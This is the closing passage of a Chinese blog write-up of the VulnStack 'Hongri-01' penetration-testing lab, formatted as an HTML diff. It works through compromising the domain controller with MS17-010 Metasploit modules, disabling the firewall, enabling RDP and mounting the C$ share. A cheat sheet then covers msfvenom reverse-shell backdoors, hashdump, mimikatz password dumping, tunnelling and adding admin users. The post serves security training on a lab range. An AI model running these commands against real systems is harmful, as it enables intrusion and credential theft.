+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/721bd044d3a44c988bc24c9752643069.png" alt="在这里插入图片描述"></p>
+<p>那就只能尝试 <code>auxiliary/admin/smb/ms17_010_command</code> 模块，借助内网隧道，利用 powershell 等方法反弹一个 cmd。这里就先不尝试了，总之 192.168.52.141 这台主机算是拿下了。</p>
+
+        <h4 id="2-3-2-4：杀入域控"   >
+          <a href="#2-3-2-4：杀入域控" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-3-2-4：杀入域控" class="headerlink" title="2.3.2.4：杀入域控"></a>2.3.2.4：杀入域控</h4>
+      <p>之前已经知道域控 ip 为 192.168.52.138。先 nmap 探测一下。<br><code>proxychains4 -q nmap 192.168.52.138 -Pn -sT --top-ports 200</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/ddab1a8a8c3e4c0caa2d753bd861b636.png" alt="在这里插入图片描述"></p>
+<p>用 msf 的 <code>auxiliary/scanner/smb/smb_version</code> 模块探测下操作系统版本。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/4da70592c5b042ac819373d7b7723372.png" alt="在这里插入图片描述"></p>
+<p>再使用 <code>auxiliary/scanner/smb/smb_ms17_010</code> 模块扫描是否可利用永恒之蓝。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/832cad581aaf444ea459480175999f63.png" alt="在这里插入图片描述"></p>
+<p>尝试利用。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.138</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> <span class="string">&#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span></span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
+
+<p>但 3389 端口开启失败。不过永恒之蓝漏洞确实是可以利用的。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/632c9f5d48194099a5c9c49cea4ba786.png" alt="在这里插入图片描述"></p>
+<p>查看了一下系统架构。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/716be0a58e954c02b2b7a87c2c1db28e.png" alt="在这里插入图片描述"></p>
+<p>内网下某些漏洞利用模块似乎无法使用。</p>
+<p>不过可以看到域控共享了 c 盘。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/e22ab59fb4cb4536bbb622b4b88adc2e.png" alt="在这里插入图片描述"></p>
+<p>可以通过 Win7 上传文件至域控。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.52.138\c$ <span class="string">&quot;hongri@2023&quot;</span> /user:<span class="string">&quot;administrator&quot;</span></span><br><span class="line">copy &lt;file&gt; \\192.168.52.138\c$</span><br><span class="line"><span class="built_in">dir</span> \\192.168.52.138\c$</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/db598169a733451d98fe86effa717f86.png" alt="在这里插入图片描述"></p>
+<p>不过尝试了多种方法也没有直接取得 shell。（主要是尝试正向连接，反弹连接应该是不用想了，主要是内网穿透工具的限制）</p>
+<p>尝试关闭防火墙。<br><code>set command &#39;chcp 65001 &amp;&amp; netsh advfirewall set allprofiles state off&#39;</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/64336efd0c72420db2cfdafbd65852c6.png" alt="在这里插入图片描述"></p>
+<p>成功。。</p>
+<p>然后 nc 就可以连上了。。。（虽然没有取得 shell）</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/0148503498ab45a1a277bb81d5af0823.png" alt="在这里插入图片描述"></p>
+<p>之后远程桌面 3389 端口也可以打开了。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/224bef2b73ee4a1fa4f64f26ba01d070.png" alt="在这里插入图片描述"></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/4c76e83f33ad4375a01f4e79589f2801.png" alt="在这里插入图片描述"></p>
+<p>至此算是拿下域控了。之前耗了很大精力各种尝试，却忘了可以直接对防火墙下手。。。已经在崩溃边缘徘徊了。。。</p>
+<p>就不重复尝试获取 shell 了。这里挂个参考文章。</p>
+<blockquote>
+<p>《ATT&amp;CK红队评估实战靶场-1》<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40638006/article/details/122033546" >https://blog.csdn.net/qq_40638006&#x2F;article&#x2F;details&#x2F;122033546</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+
+        <h1 id="3：总结"   >
+          <a href="#3：总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#3：总结" class="headerlink" title="3：总结"></a>3：总结</h1>
+      <p>作为第一个内网靶场，说难也难，说简单也不简单。╮(︶﹏︶”)╭ 鬼知道我经历了什么</p>
+
+        <h2 id="3-1：命令-工具"   >
+          <a href="#3-1：命令-工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1：命令-工具" class="headerlink" title="3.1：命令 &amp; 工具"></a>3.1：命令 &amp; 工具</h2>
+      <ul>
+<li>nmap</li>
+<li>蚁剑</li>
+<li>msf</li>
+<li>rdesktop</li>
+<li>mimikatz</li>
+<li>EarthWorm</li>
+<li>proxychains4</li>
+<li>netcat</li>
+</ul>
+
+        <h3 id="3-1-1：Nmap"   >
+          <a href="#3-1-1：Nmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-1：Nmap" class="headerlink" title="3.1.1：Nmap"></a>3.1.1：Nmap</h3>
+      <p><strong>部分选项</strong>：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>-sn</code></td>
+<td align="left"><code>Ping Scan - disable port scan</code></td>
+</tr>
+<tr>
+<td align="left"><code>-sV</code></td>
+<td align="left"><code>Probe open ports to determine service/version info</code></td>
+</tr>
+<tr>
+<td align="left"><code>-sC</code></td>
+<td align="left"><code>equivalent to --script=default</code></td>
+</tr>
+<tr>
+<td align="left"><code>-Pn</code></td>
+<td align="left"><code>Treat all hosts as online -- skip host discovery</code></td>
+</tr>
+<tr>
+<td align="left"><code>-sS/sT/sA/sW/sM</code></td>
+<td align="left"><code>TCP SYN/Connect()/ACK/Window/Maimon scans</code></td>
+</tr>
+<tr>
+<td align="left"><code>--top-ports &lt;num&gt;</code></td>
+<td align="left"><code>Scan &lt;num&gt; most common ports</code></td>
+</tr>
+</tbody></table></div>
+<p><strong>部分命令</strong>：</p>
+<p>目标信息扫描，进行端口扫描、服务探测、操作系统探测，并保存：<br><code>nmap &lt;target&gt; -p- -sV -sC -O -oN nmap-scan.txt</code></p>
+<p>目标漏洞扫描，用 nmap 的漏洞库对端口进行扫描：<br><code>nmap &lt;target&gt; --script=vuln -p &lt;port&gt;</code></p>
+
+        <h3 id="3-1-2：MSF"   >
+          <a href="#3-1-2：MSF" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-2：MSF" class="headerlink" title="3.1.2：MSF"></a>3.1.2：MSF</h3>
+      <p>以该靶场为例介绍 MSF。</p>
+<p><strong>初始化 msf 数据库并启动</strong>：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfdb init &amp;&amp; msfconsole</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="3-1-2-1：web-server-渗透"   >
+          <a href="#3-1-2-1：web-server-渗透" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-2-1：web-server-渗透" class="headerlink" title="3.1.2.1：web server 渗透"></a>3.1.2.1：web server 渗透</h4>
+      <p><strong>查看 Windows 反弹 shell 的相关工具</strong>：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>生成 Windows 后门程序</strong>（Windows 载荷），反弹 shell：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe -o <span class="string">&#x27;&lt;exe file&gt;&#x27;</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>msf 配置启动监听</strong>。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> lhost &lt;ip&gt;</span><br><span class="line"><span class="built_in">set</span> lport &lt;port&gt;</span><br><span class="line">exploit</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>将生成的 exe 后门程序通过蚁剑上传到目标机器并运行</strong>。</p>
+<p><strong>后渗透 &amp; 后渗透模块使用</strong>：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getuid                                                  <span class="comment"># 查看用户</span></span><br><span class="line">getsystem                                               <span class="comment"># 提权</span></span><br><span class="line">run post/windows/manage/enable_rdp                      <span class="comment"># 关闭防火墙并启用远程桌面</span></span><br><span class="line">run post/windows/gather/enum_patches                    <span class="comment"># 查询补丁信息</span></span><br><span class="line">run post/windows/gather/enum_applications               <span class="comment"># 查询已安装软件</span></span><br><span class="line">run post/windows/gather/arp_scanner RHOSTS=&lt;ip cidr&gt;    <span class="comment"># arp 内网扫描（需添加内网路由）</span></span><br><span class="line">run get_local_subnets                                   <span class="comment"># 查看路由信息</span></span><br><span class="line">run windows/gather/smart_hashdump                       <span class="comment"># 抓取密码 Hash</span></span><br><span class="line">upload &lt;file&gt; &lt;path&gt;                                    <span class="comment"># 上传文件至目标机器</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>通过已控制的 session 添加内网路由</strong>：</p>
+<ol>
+<li>将获取的 session 挂到后台。<br><code>background</code></li>
+<li>查看路由：<br><code>route print</code></li>
+<li>添加内网路由：<code>route add &lt;ip&gt; &lt;mask&gt; &lt;session id&gt;</code></li>
+</ol>
+<blockquote>
+<p>如下添加全网段路由，可以访问被控机器可达的所有地址：<br><code>route add 0.0.0.0 0.0.0.0 &lt;session id&gt;</code></p>
+</blockquote>
+
+        <h4 id="3-1-2-2：域成员-Win-2003-渗透"   >
+          <a href="#3-1-2-2：域成员-Win-2003-渗透" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-2-2：域成员-Win-2003-渗透" class="headerlink" title="3.1.2.2：域成员 Win 2003 渗透"></a>3.1.2.2：域成员 Win 2003 渗透</h4>
+      <p><strong>445 端口开启，可以使用相应模块探测操作系统版本</strong>：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>445 端口开启，可以尝试利用 MS17-010（永恒之蓝）漏洞</strong>：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line"><span class="comment"># 可以使用 auxiliary/scanner/smb/smb_ms17_010 模块检测 MS17-010 是否可利用。</span></span><br><span class="line"><span class="comment"># 使用以下模块执行命令将目标 3389 端口开启。</span></span><br><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.141</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> <span class="string">&#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span></span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="3-1-3：mimikatz"   >
+          <a href="#3-1-3：mimikatz" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-3：mimikatz" class="headerlink" title="3.1.3：mimikatz"></a>3.1.3：mimikatz</h3>
+      <blockquote>
+<p>kali 自带 mimikatz：<font style="background:#70AD47">&#x2F;usr&#x2F;share&#x2F;windows-resources&#x2F;mimikatz&#x2F;</font></p>
+</blockquote>
+<p><strong>mimikatz 提升权限</strong>：<br><code>privilege::debug</code></p>
+<p><strong>抓取密码</strong>：<br><code>sekurlsa::logonpasswords</code></p>
+
+        <h3 id="3-1-4：EarthWorm"   >
+          <a href="#3-1-4：EarthWorm" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-4：EarthWorm" class="headerlink" title="3.1.4：EarthWorm"></a>3.1.4：EarthWorm</h3>
+      <p><strong>内网穿透工具 EarthWorm（EW）项目地址</strong>：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/idlefire/ew" >https://github.com/idlefire/ew</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>ew 已经停止更新很久了。这里补充一些内网渗透的知识和工具。</p>
+<p>《内网穿透常用方法系列总结》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64910183/article/details/129211220" >https://blog.csdn.net/m0_64910183&#x2F;article&#x2F;details&#x2F;129211220</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>《几款实用的内网穿透工具》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/MachineGunJoe/article/details/129385096" >https://blog.csdn.net/MachineGunJoe/article/details/129385096</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>《内网安全：内网穿透详解》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61553520/article/details/131037631" >https://blog.csdn.net/qq_61553520&#x2F;article&#x2F;details&#x2F;131037631</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="3-1-5：proxychains4"   >
+          <a href="#3-1-5：proxychains4" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-5：proxychains4" class="headerlink" title="3.1.5：proxychains4"></a>3.1.5：proxychains4</h3>
+      <p><strong>proxychains4 配置文件</strong>：<font style="background:#70AD47">&#x2F;etc&#x2F;proxychains4.conf</font>。</p>
+<p><strong>部分命令</strong>：</p>
+<p>基本使用：<br><code>proxychains4 &lt;command&gt;</code></p>
+<p>使用安静模式：<br><code>proxychains4 -q &lt;command&gt;</code></p>
+
+        <h3 id="3-1-6：Windows-命令使用"   >
+          <a href="#3-1-6：Windows-命令使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-6：Windows-命令使用" class="headerlink" title="3.1.6：Windows 命令使用"></a>3.1.6：Windows 命令使用</h3>
+      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001                                       # 将当前控制台代码页设置为 UTF-8</span><br><span class="line">ipconfig /all                                    # 查询本机 ip 段，所在域等</span><br><span class="line">route print                                      # 路由信息 </span><br><span class="line">netsh advfirewall set allprofiles state off      # 关闭系统防火墙</span><br><span class="line">wmic os get osarchitecture                       # 查看系统架构</span><br><span class="line">net config workstation                           # 当前计算机名，用户名，系统版本，工作站域    </span><br><span class="line">net user                                         # 本机用户列表   </span><br><span class="line">net user /domain                                 # 当前域下本机的所有用户 </span><br><span class="line">net user &lt;username&gt; &lt;password&gt; /add              # 添加一个用户</span><br><span class="line">net localgroup administrators &lt;username&gt; /add    # 将用户添加至管理员组</span><br><span class="line">net localgroup administrators                    # 查看本机管理员（通常含有域用户）    </span><br><span class="line">net view                                         # 查看域信息 / 局域网内其他主机    </span><br><span class="line">net view /domain                                 # 查询主域信息   </span><br><span class="line">net time /domain                                 # 判断主域</span><br><span class="line">net start                                        # 查看开启了哪些服务</span><br><span class="line">net share                                        # 查看开启了哪些共享        </span><br><span class="line">net group &quot;domain controllers&quot; /domain           # 查看域控制器组</span><br><span class="line">net group &quot;domain computers&quot; /domain             # 查看域中的其他主机</span><br><span class="line">net group &quot;domain admins&quot; /domain                # 尝试查询域管理员的名字</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>使用 ping 命令探测内网存活主机</strong>（以 192.168.52.0&#x2F;24 为例）：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for /L %I in (1,1,254) DO @ping -w 1 -n 1 xxx.xxx.xx.%I | findstr &quot;TTL=&quot;</span></span><br><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr <span class="string">&quot;TTL=&quot;</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>开启远程桌面服务（3389 端口）</strong>：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>在本地系统上映射远程计算机的共享文件夹</strong>（以共享 C 盘为例）：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># net use \\&lt;ip&gt;\&lt;path&gt; &quot;&lt;password&gt;&quot; /user:&quot;&lt;username&gt;&quot;</span></span><br><span class="line">net use \\192.168.52.138\c$ <span class="string">&quot;hongri@2023&quot;</span> /user:<span class="string">&quot;administrator&quot;</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>将文件复制到远程计算机的共享文件夹中</strong>：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy &lt;file&gt; \\&lt;ip&gt;\&lt;path&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>查看远程计算机的共享文件夹</strong>：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\&lt;ip&gt;\&lt;path&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="3-2：关键技术"   >
+          <a href="#3-2：关键技术" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-2：关键技术" class="headerlink" title="3.2：关键技术"></a>3.2：关键技术</h2>
+      <ul>
+<li><p><strong>主机发现</strong>：<br><code>nmap -sn &lt;ip cidr&gt;</code></p>
+</li>
+<li><p><strong>目标信息扫描</strong>，进行端口扫描、服务探测、操作系统探测：<br><code>nmap &lt;target&gt; -p- -sV -sC -O</code></p>
+</li>
+<li><p><strong>目标漏洞扫描</strong>，用 nmap 的漏洞库对端口进行扫描：<br><code>nmap &lt;target&gt; --script=vuln -p &lt;port&gt;</code></p>
+</li>
+<li><p><strong>网站首页信息泄露</strong>。</p>
+</li>
+<li><p><strong>网站后台登录</strong>，写入一句话木马，蚁剑连接。</p>
+</li>
+<li><p><strong>msf 渗透 web 服务器， 并对 web 服务器进行信息收集</strong>。</p>
+</li>
+<li><p><strong>mimikatz 抓取密码</strong>。</p>
+</li>
+<li><p><strong>rdesktop 连接远程桌面</strong>：<br><code>rdesktop &lt;ip&gt;</code></p>
+</li>
+<li><p><strong>msf 借助服务器使用 ping 命令探测内网存活主机</strong>。</p>
+</li>
+<li><p><strong>msf 通过已控制的 session 添加内网路由</strong>。</p>
+</li>
+<li><p><strong>使用 EarthWorm 进行内网穿透</strong>，做 Socks5 代理作为跳板进入内网。</p>
+</li>
+<li><p><strong>使用 proxychains4 作为代理</strong>。<br><code>proxychains4 -q &lt;command&gt;</code></p>
+</li>
+<li><p><strong>msf 渗透域成员（win2003）</strong>，MS17-010（永恒之蓝）漏洞利用。</p>
+</li>
+<li><p><strong>msf 渗透域控（win2008）</strong>，MS17-010（永恒之蓝）漏洞利用，共享 C 盘利用。</p>
+</li>
+</ul>
+<hr>
+<p><font color="#EE2C2C">
+人生亦有命，安能行叹复坐愁？
+</font></p>
+<p align="right"><font color="#EE2C2C">
+——《拟行路难 · 其四》（南北朝）鲍照
+</font></p>
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://blog.lens-shrine.top">镜坛主</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://blog.lens-shrine.top/2024/01/29/WriteUp%EF%BC%9ACyber-Range/VulnStack/01.%20%E7%BA%A2%E6%97%A5-01/">https://blog.lens-shrine.top/2024/01/29/WriteUp%EF%BC%9ACyber-Range/VulnStack/01.%20%E7%BA%A2%E6%97%A5-01/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2024/02/05/%E7%95%AA%E5%A4%96%EF%BC%9A%E9%9D%92%E7%AB%B9%E5%B0%8F%E8%BD%A9/%E5%AE%B6%E5%B8%B8%E8%8F%9C%E8%B0%B1/01.%20%E8%92%9C%E8%8B%97%E7%82%92%E5%B9%B2%E5%B7%B4/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">《家常菜谱》蒜苗炒干巴</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2024/01/17/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/05.%20Less%2029~37/"><span class="paginator-prev__text">《SQLi-Labs》05. Less 29~37</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%EF%BC%9A%E9%9D%B6%E5%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-text">
+          1：靶场信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%EF%BC%9A%E6%89%93%E9%9D%B6"><span class="toc-text">
+          2：打靶</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86-%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1"><span class="toc-text">
+          2.1：情报收集 &amp; 威胁建模</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="toc-text">
+          2.2：漏洞分析 &amp; 渗透攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3%EF%BC%9A%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-text">
+          2.3：后渗透</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%EF%BC%9A%E6%80%BB%E7%BB%93"><span class="toc-text">
+          3：总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1%EF%BC%9A%E5%91%BD%E4%BB%A4-%E5%B7%A5%E5%85%B7"><span class="toc-text">
+          3.1：命令 &amp; 工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF"><span class="toc-text">
+          3.2：关键技术</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/notAlone.png" alt="avatar"></div><p class="sidebar-ov-author__text">但愿五湖明月在。</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">50</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">21</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022~2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>镜坛主</span></div><div>欢迎来到 —— 镜坛！</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload",".header-banner"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
+  // 加载进度条的计时器
+  var loadingTimer = null;
+
+  // 重置页面 Y 方向上的滚动偏移量
+  document.addEventListener('pjax:send', function () {
+    $('.header-nav-menu').removeClass('show');
+    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
+      $('html').velocity('scroll', {
+        duration: 500,
+        offset: $('#header').height(),
+        easing: 'easeInOutCubic'
+      });
+    }
+
+    var loadingBarWidth = 20;
+    var MAX_LOADING_WIDTH = 95;
+
